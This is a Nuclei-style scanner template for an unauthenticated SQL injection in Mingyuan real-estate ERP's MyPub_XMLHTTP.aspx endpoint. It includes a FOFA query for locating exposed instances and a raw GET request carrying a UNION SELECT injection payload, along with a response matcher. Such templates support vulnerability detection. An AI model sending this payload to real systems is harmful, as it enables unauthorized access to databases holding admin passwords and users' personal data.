id: MingyuandichanERP-MyPub_XMLHTTP-SQL

info:
  name: 明源地产ERP MyPub_XMLHTTP.aspx SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="/_common/scripts/md5-min.js"
    明源地产ERP MyPub_XMLHTTP.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: sql injection

http:
  - raw:
      - |-
        GET /Sldzkp/DZKP/MyPub_XMLHTTP.aspx/?ywtype=GETPRINTVAL&rptid=1%27+UNION+ALL+SELECT+NULL%2C%27e10adc3949ba59abbe56e057f20f883e%27%2CNULL%2CNULL-- HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - 'status_code==200 && contains_all(body,"e10adc3949ba59abbe56e057f20f883e")'